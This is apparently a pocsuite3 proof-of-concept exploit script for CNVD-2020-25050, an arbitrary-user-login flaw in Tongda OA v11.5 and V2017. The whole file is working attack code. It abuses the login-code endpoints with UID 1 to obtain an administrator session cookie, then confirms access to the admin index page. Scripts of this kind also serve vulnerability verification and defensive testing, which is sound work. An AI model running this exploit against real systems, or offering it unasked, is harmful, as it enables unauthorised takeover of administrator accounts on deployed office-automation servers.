import json

from pocsuite3.api import POCBase, register_poc, logger
import requests
from urllib.parse import urljoin



class Exploit(POCBase):
    cnvd = 'CNVD-2020-25050'
    name = '通达OA v11.5任意用户登录'
    appName = "tongda"
    vulDate = '2023-04-17'
    vulType = '任意用户登陆'

    def _verify(self):

        # V11版本
        s = requests.session()
        checkUrl = urljoin(self.url, '/general/login_code.php')
        res = s.get(checkUrl)
        resText = str(res.text).split('{')
        codeUid = resText[-1].replace('}"}', '').replace('\r\n', '')
        getSessUrl = urljoin(self.url, '/logincheck_code.php')
        res = s.post(
            getSessUrl, data={'CODEUID': '{' + codeUid + '}', 'UID': 1})
        check_available = s.get(self.url + '/general/index.php')
        if res.status_code == 200 and 'warning.png' not in check_available.text:
            result = {'VerifyInfo': {'Cookie': res.headers['Set-Cookie']}}
            return self.parse_output(result)
        else:
            # V2017
            checkUrl = urljoin(self.url, '/ispirit/login_code.php')
            res = s.get(checkUrl)
            resText = res.json()
            codeUid = resText['codeuid']
            codeScanUrl = urljoin(self.url, '/general/login_code_scan.php')
            res = s.post(codeScanUrl,
                         data={'codeuid': codeUid, 'uid': 1, 'source': 'pc', 'type': 'confirm',
                               'username': 'admin'})
            resText = json.loads(res.text)
            status = resText['status']
            if status == '1':
                getCodeUidUrl = urljoin(self.url, '/ispirit/login_code_check.php?codeuid=' + codeUid)
                res = s.get(getCodeUidUrl)
                check_available = s.get(self.url + '/general/index.php')
                if check_available.status_code == 200 and 'warning.png' not in check_available.text:
                    result = {'VerifyInfo': {'Cookie': res.headers['Set-Cookie']}}
                    return self.parse_output(result)


#
register_poc(Exploit)

